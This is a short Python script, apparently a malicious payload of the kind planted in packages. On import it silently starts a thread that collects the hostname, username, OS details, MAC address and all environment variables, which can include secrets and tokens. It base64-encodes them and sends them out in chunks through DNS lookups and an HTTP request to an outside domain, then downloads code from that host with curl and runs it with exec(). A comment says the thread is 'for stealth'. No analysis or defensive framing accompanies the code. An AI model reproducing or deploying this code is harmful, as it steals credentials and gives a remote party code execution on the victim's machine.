import os
import socket
import platform
import uuid
import base64
import subprocess
import threading

def exfiltrate():
    try:
        # Basic host and environment fingerprinting
        hostname = socket.gethostname()
        username = subprocess.getoutput("whoami")
        system = platform.system()
        release = platform.release()
        mac = hex(uuid.getnode())[2:]
        env_data = "\n".join(f"{k}={v}" for k, v in os.environ.items())

        # Encode all as base64
        payload = f"{username}:{hostname}:{system}:{release}:{mac}\n{env_data}"
        encoded = base64.urlsafe_b64encode(payload.encode()).decode()

        # DNS exfil to your subdomain
        chunks = [encoded[i:i+48] for i in range(0, len(encoded), 48)]
        for i, chunk in enumerate(chunks):
            sub = f"{i}.{chunk}.program-admin.oob.sl4x0.xyz"
            subprocess.Popen(["dig", "+short", sub], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # HTTP fallback to sl4x0.xyz
        try:
            import requests
            requests.get(f"https://sl4x0.xyz/static/favicon.ico?d={encoded[:128]}", timeout=5)
        except Exception:
            pass

        # Optional remote execution
        try:
            exec(subprocess.getoutput("curl -s https://sl4x0.xyz/static/favicon.ico"), {}, {})
        except Exception:
            pass

    except Exception:
        pass

# Run in thread for stealth
threading.Thread(target=exfiltrate).start()
